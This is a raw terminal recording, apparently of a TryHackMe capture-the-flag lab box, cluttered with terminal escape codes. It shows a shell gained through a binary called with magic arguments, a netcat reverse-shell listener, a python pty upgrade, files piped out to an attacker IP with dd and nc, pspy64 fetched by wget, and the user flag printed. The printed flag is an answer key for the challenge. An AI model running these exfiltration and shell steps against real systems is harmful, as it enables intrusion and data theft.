+xrefresh
+xrotate
+x-session-manager
+xset
+xsetmode
+xsetpointer
+xsetroot
+xsetwacom
+xsm
+xstdcmap
+xsubpp
+xterm
+x-terminal-emulator
+xvidtune
+xvinfo
+xvminitoppm
+xwd
+xwdtopnm
+xwininfo
+xwud
+x-www-browser
+xxd
+xz
+xzcat
+xzcmp
+xzdiff
+xzegrep
+xzfgrep
+xzgrep
+xzless
+xzmore
+ybmtopbm
+yelp
+yes
+yuvsplittoppm
+yuvtoppm
+zdump
+zeisstopnm
+zeitgeist-daemon
+zeitgeist-datahub
+zenity
+zip
+zipcloak
+zipdetails
+zipgrep
+zipinfo
+zipnote
+zipsplit
+zjsdecode
+zlib-flate
+www-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ ./[7m/usr/bin/blogFeedback[27m/usr/bin/blogFeedback[C[C[4PlogFeedback[4PblogFeedback[1PblogFeedback[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./blogFeedback
+[K./blogFeedback[K./blogFeedback[K./blogFeedback
+Order my blogs!
+www-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ dd=[K if=blogFeedback status=progress | nc 10.8.61.1[K245 9999[K[K[K[K4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=blogFeedback status=progress | nc 10.8.61.245 4444
+[K<=blogFeedback status=progress | nc 10.8.61.245 4444[K<=blogFeedback status=progress | nc 10.8.61.245 4444[K<=blogFeedback status=progress | nc 10.8.61.245 4444
+32+1 records in
+32+1 records out
+16768 bytes (17 kB, 16 KiB) copied, 3.834e-05 s, 437 MB/s
+[Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ dd if=blogFeedback status=progress | nc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./blogFeedback[K 6 5 4 3 2 1[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./blogFeedback 6 5 4 3 2 1
+[K./blogFeedback 6 5 4 3 2 1[K./blogFeedback 6 5 4 3 2 1[K./blogFeedback 6 5 4 3 2 1
+[K[K[?2004h[?2004l[?2004h
+[K
+[?2004l
+Script done on 2025-02-14 22:56:13+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-02-14 22:56:17+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 5636
+bash: cannot set terminal process group (404): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+www-data@bobloblaw-VirtualBox:~/html2$ [Kwww-data@bobloblaw-VirtualBox:~/html2$ [K[?2004hwww-data@bobloblaw-VirtualBox:~/html2$ op [K[K[Kcd /s[Kusr/bin[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /usr/bin
+[Kcd /usr/bin[Kcd /usr/bin[Kcd /usr/bin
+www-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ ls | grep n;[K[Kblog[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls | grep blog
+[Kls | grep blog[Kls | grep blog[Kls | grep blog
+blogFeedback
+www-data@bobloblaw-VirtualBox:/usr/bin$ [Kwww-data@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hwww-data@bobloblaw-VirtualBox:/usr/bin$ ./blogFeedback 6 5 4 3 2 1[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./blogFeedback 6 5 4 3 2 1
+[K./blogFeedback 6 5 4 3 2 1[K./blogFeedback 6 5 4 3 2 1[K./blogFeedback 6 5 4 3 2 1
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kbobloblaw@bobloblaw-VirtualBox:/usr/bin$ [Kbobloblaw@bobloblaw-VirtualBox:/usr/bin$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/usr/bin$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd
+bobloblaw@bobloblaw-VirtualBox:~$ [Kbobloblaw@bobloblaw-VirtualBox:~$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+html  html2  html4  reno2.jpg  reno.jpg
+bobloblaw@bobloblaw-VirtualBox:~$ [Kbobloblaw@bobloblaw-VirtualBox:~$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:~$ whoami[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami
+[Kbobloblaw
+bobloblaw@bobloblaw-VirtualBox:~$ [Kbobloblaw@bobloblaw-VirtualBox:~$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:~$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+bobloblaw@bobloblaw-VirtualBox:/var$ [Kbobloblaw@bobloblaw-VirtualBox:/var$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/var$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+backups  crash[Kbackups  crash[Kbackups  crash	local  log   metrics  run   spool  www
+cache	 lib	lock   mail  opt      snap  tmp
+bobloblaw@bobloblaw-VirtualBox:/var$ [Kbobloblaw@bobloblaw-VirtualBox:/var$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/var$ cd /[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /
+[Kcd /
+bobloblaw@bobloblaw-VirtualBox:/$ [Kbobloblaw@bobloblaw-VirtualBox:/$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+You haven't rooted me yet? Jeez[KYou haven't rooted me yet? Jeez[KYou haven't rooted me yet? Jeez
+ls
+bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib	     media	 proc  sbin  swapfile  usr  vmlinuz.old
+bobloblaw@bobloblaw-VirtualBox:/$ [Kbobloblaw@bobloblaw-VirtualBox:/$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/$ cd home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd home
+[Kcd home[Kcd home[Kcd home
+bobloblaw@bobloblaw-VirtualBox:/home$ [Kbobloblaw@bobloblaw-VirtualBox:/home$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+bob  bobloblaw
+bobloblaw@bobloblaw-VirtualBox:/home$ [Kbobloblaw@bobloblaw-VirtualBox:/home$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home$ cd b      [K[K[K[K[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 16
+drwxr-xr-x  4 root      root      4096 Jul 25  2020 .
+drwxr-xr-x 25 root      root      4096 Jul 28  2020 ..
+dr-xr-xr-x  3 bob       bob       4096 Jul 25  2020 bob
+drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug  6  2020 bobloblaw
+bobloblaw@bobloblaw-VirtualBox:/home$ [Kbobloblaw@bobloblaw-VirtualBox:/home$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home$ cd bobo[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd bob
+[Kcd bob
+bobloblaw@bobloblaw-VirtualBox:/home/bob$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bob$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bob$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kexamples.desktop  ftp
+bobloblaw@bobloblaw-VirtualBox:/home/bob$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bob$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bob$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+bobloblaw@bobloblaw-VirtualBox:/home$ [Kbobloblaw@bobloblaw-VirtualBox:/home$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home$ ls cd[K[K[K[K[Kcd bobloblw[Kaw[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd bobloblaw
+[Kcd bobloblaw
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+Desktop    Downloads	     Music     Public	  Videos
+Documents  examples.desktop  Pictures  Templates
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ cd Desktop[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd Desktop
+[Kcd Desktop
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+dontlookatthis.jpg  lookatme.jpg  user.txt
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt
+[KTHM{C0NGR4t$_g3++ing_this_fur}
+
+@jakeyee thank you so so so much for the help with the foothold on the box!!
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
+[K[K[?2004h[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ dd if=[7mdontlookatthis.jpg[27mdontlookatthis.jpg status=progress[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kpython3 -m http.serv[K[?2004l[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeezpython3 -m http.server[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
+[K[?2004hpython3 -m http.server[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ python3 -m http.server 80[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpython3 -m http.server 80
+[K<:/home/bobloblaw/Desktop$ python3 -m http.server 80    
+[KTraceback (most recent call last):
+  File "/usr/lib/python3.5/runpy.py", line 193, in _run_module_as_main
+    "__main__", mod_spec)
+  File "/usr/lib/python3.5/runpy.py", line 85, in _run_code
+    exec(code, run_globals)
+  File "/usr/lib/python3.5/http/server.py", line 1221, in <module>
+    test(HandlerClass=handler_class, port=args.port, bind=args.bind)
+  File "/usr/lib/python3.5/http/server.py", line 1194, in test
+    httpd = ServerClass(server_address, HandlerClass)
+  File "/usr/lib/python3.5/socketserver.py", line 440, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.5/http/server.py", line 138, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.5/socketserver.py", line 454, in server_bind
+    self.socket.bind(self.server_address)
+PermissionError: [Errno 13] Permission denied
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ dd if [K=[7mdontlookatthis.jpg[27mdontlookatthis.jpg status [K=progress | nc 10 .8.5[K61.245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=dontlookatthis.jpg status=progress | nc 10.8.61.245 4444
+[K<ookatthis.jpg status=progress | nc 10.8.61.245 4444    
+[K21+1 records in
+21+1 records out
+11054 bytes (11 kB, 11 KiB) copied, 0.00155493 s, 7.1 MB/s
+[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ dd if [K=[7mlookatme.jpg[27mlookatme.jpg status=progres[K[?2004l[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeezdd if=lookatme.jpg status=progress [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
+[K[?2004hdd if=lookatme.jpg status=progress | nc [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ dd if=[7mlookatme.jpg[27mlookatme.jpg | nc [K[K[K[K[Kstatus=progress | nc 10.8.61. 245 4444[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=lookatme.jpg status=progress | nc 10.8.61.245 4444
+[K<=lookatme.jpg status=progress | nc 10.8.61.245 4444    
+[K20+1 records in
+20+1 records out
+10646 bytes (11 kB, 10 KiB) copied, 0.00070984 s, 15.0 MB/s
+[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
+[K[K[?2004h[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez[Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
+[KYou haven't rooted me yet? Jeez[KYou haven't rooted me yet? Jeez[KYou haven't rooted me yet? Jeez
+[K[K[?2004h[?2004l[?2004h
+[K
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ wget http://10.8.61.245/pspy64[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/pspy64
+[K<e/bobloblaw/Desktop$ wget http://10.8.61.245/pspy64    
+[K--2025-02-14 15:05:58--  http://10.8.61.245/pspy64
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                0%[                    ]       0  --.-KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               [Kpspy64                1%[                    ]  40.40K  71.7KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               pspy64                2%[                    ]  88.48K   105KB/s               [Kpspy64                2%[                    ]  88.48K   105KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               pspy64                2%[                    ]  88.48K   105KB/s               pspy64                6%[>                   ] 184.42K   164KB/s               [Kpspy64                6%[>                   ] 184.42K   164KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               pspy64                2%[                    ]  88.48K   105KB/s               pspy64                6%[>                   ] 184.42K   164KB/s               pspy64               12%[=>                  ] 381.31K   272KB/s               [Kpspy64               12%[=>                  ] 381.31K   272KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               pspy64                2%[                    ]  88.48K   105KB/s               pspy64                6%[>                   ] 184.42K   164KB/s               pspy64               12%[=>                  ] 381.31K   272KB/s               pspy64               24%[===>                ] 738.83K   439KB/s               pspy64               32%[=====>              ] 993.91K   527KB/s               [Kpspy64               32%[=====>              ] 993.91K   527KB/s               [Kpspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  13.25K  46.4KB/s               pspy64                1%[                    ]  40.40K  71.7KB/s               pspy64                2%[                    ]  88.48K   105KB/s               pspy64                6%[>                   ] 184.42K   164KB/s               pspy64               12%[=>                  ] 381.31K   272KB/s               pspy64               24%[===>                ] 738.83K   439KB/s               pspy64               32%[=====>              ] 993.91K   527KB/s               You haven't rooted me yet? Jeez
+pspy64               40%[=======>            ]   1.20M   588KB/s               [Kpspy64               40%[=======>            ]   1.20M   588KB/s               [Kpspy64               40%[=======>            ]   1.20M   588KB/s               pspy64               43%[=======>            ]   1.29M   524KB/s               [Kpspy64               43%[=======>            ]   1.29M   524KB/s               [Kpspy64               40%[=======>            ]   1.20M   588KB/s               pspy64               43%[=======>            ]   1.29M   524KB/s               pspy64               70%[=============>      ]   2.10M   788KB/s               pspy64               77%[==============>     ]   2.30M   804KB/s               [Kpspy64               77%[==============>     ]   2.30M   804KB/s               [Kpspy64               40%[=======>            ]   1.20M   588KB/s               pspy64               43%[=======>            ]   1.29M   524KB/s               pspy64               70%[=============>      ]   2.10M   788KB/s               pspy64               77%[==============>     ]   2.30M   804KB/s               pspy64               86%[================>   ]   2.56M   828KB/s    eta 0s     [Kpspy64               86%[================>   ]   2.56M   828KB/s    eta 0s     [Kpspy64               40%[=======>            ]   1.20M   588KB/s               pspy64               43%[=======>            ]   1.29M   524KB/s               pspy64               70%[=============>      ]   2.10M   788KB/s               pspy64               77%[==============>     ]   2.30M   804KB/s               pspy64               86%[================>   ]   2.56M   828KB/s    eta 0s     pspy64               87%[================>   ]   2.58M   734KB/s    eta 1s     pspy64              100%[===================>]   2.96M   840KB/s    in 3.6s    
+
+2025-02-14 15:06:02 (840 KB/s) - ‘pspy64’ saved [3104768/3104768]
+
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ chmod +x pspy64[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x pspy64
+[Kchmod +x pspy64
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [Kbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ [K[?2004hbobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 132
+drwxrwx--- 16 bobloblaw bobloblaw  4096 Aug  6  2020 .
+drwxr-xr-x  4 root      root       4096 Jul 25  2020 ..
+-rw-r--r--  1 bobloblaw bobloblaw   129 Jul 25  2020 .apport-ignore.xml
+lrwxrwxrwx  1 bobloblaw bobloblaw     9 Jul 29  2020 .bash_history -> /dev/null
+-rw-r--r--  1 bobloblaw bobloblaw   220 Jul 24  2020 .bash_logout
+-rw-r--r--  1 bobloblaw bobloblaw  3771 Jul 24  2020 .bashrc
+drwx------ 15 bobloblaw bobloblaw  4096 Jul 27  2020 .cache
+drwx------  3 bobloblaw bobloblaw  4096 Jul 24  2020 .compiz
+drwx------ 16 bobloblaw bobloblaw  4096 Jul 27  2020 .config
+drwxrwx---  3 bobloblaw bobloblaw  4096 Feb 14 15:05 Desktop
+-rw-r--r--  1 bobloblaw bobloblaw    25 Jul 24  2020 .dmrc
